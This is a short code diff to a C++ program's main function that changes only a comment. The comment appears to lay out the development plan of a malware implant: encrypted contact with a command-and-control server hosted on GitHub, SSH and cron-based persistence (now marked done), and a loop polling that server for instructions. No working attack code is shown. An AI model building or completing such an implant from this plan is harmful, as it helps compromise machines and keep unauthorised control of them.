@@ -13,10 +13,11 @@
 int main() {
     Core run;
     /*
-     * TODO:
-     *
+     * DONE:
      * 1. establish encrypted contact with the C2 GitHub over https                     (Core::contact_server)
-     * 2. establish SSH (if possible) and cron based persistence                        (Core::)
+     * 2. establish SSH (if possible) and cron based persistence                        (Core::establish_persistence)
+     *
+     * TODO:
      * 3. start looping, irregularly checking back with the C2 for instruction          (Core::loop)
      *
      * */
